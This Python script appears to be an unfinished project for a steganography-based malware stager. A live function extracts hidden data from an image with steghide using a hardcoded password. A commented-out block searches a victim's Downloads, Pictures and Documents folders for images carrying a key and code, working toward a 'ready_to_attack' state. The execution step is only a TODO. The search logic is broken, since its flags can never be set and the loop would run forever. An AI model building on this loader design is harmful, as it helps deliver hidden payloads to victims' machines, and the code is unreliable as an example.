import os
import subprocess #use to run steghide
from cryptography.fernet import Fernet

def extract_message(image_path: str, password):
    """Executes commandlines on powershell to run steghide and obtain in order
    to obtain the "secret" message embedded within a given image.

    :param image_path: The location on the computer where the image to be
        examined is located
    :param password: The key used to decrypt and access the "secret" message
        in the image
    :return: A string representing the secret text from the image
    """
    result = subprocess.run(["steghide","extract", "-sf", image_path], input = password, text = True, capture_output = True)

    print(result.stdout)

    
    #pass

def main():
    
    extract_message("download.jpg", "Mochi")
    """bool: readyToAttack = False  # Identifies if upon execution, the computer being run from is a victim

    # Represents the two images to be scanned for in the downloads directory
    imageContainingKey = "image1.png"
    imageContainingCode = "image2.png"

    # Represents whether the two images were found or not
    keyFound = False
    codeFound = False

    # Scans the Downloads folder to look for the images and applications needed
    # for the malware to remain operational
    whitelist = [imageContainingKey, imageContainingCode]
    downloads_directory = os.path.expanduser("~/Downloads")
    for root, dirs, files in os.walk(downloads_directory):
        for file in files:
            if file in ["encrypt.exe", "scan_and_execute.py"]:
                if file == imageContainingKey:
                    keyFound = True
                if file == imageContainingCode:
                    codeFound = True
            print(file)

    ready_to_attack = keyFound and codeFound

    # Have to keep looking for them at all times until both are found
    while not ready_to_attack:
        # Checks to see if the images are in Downloads or if user moved them to
        # another directory
        directories_to_be_searched = [downloads_directory,
                                      os.path.expanduser("~/Pictures"),
                                      os.path.expanduser("~/Documents")]
        for directory in directories_to_be_searched:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file in ["encrypt.exe", "scan_and_execute.py"]:
                        if file == imageContainingKey:
                            keyFound = True
                        if file == imageContainingCode:
                            codeFound = True
                        ready_to_attack = keyFound and codeFound
                    print(file)

    # TODO: Should execute steghide to extract the key and code to be executed
    if ready_to_attack:
        pass

    input("Press Enter to exit...")"""

main()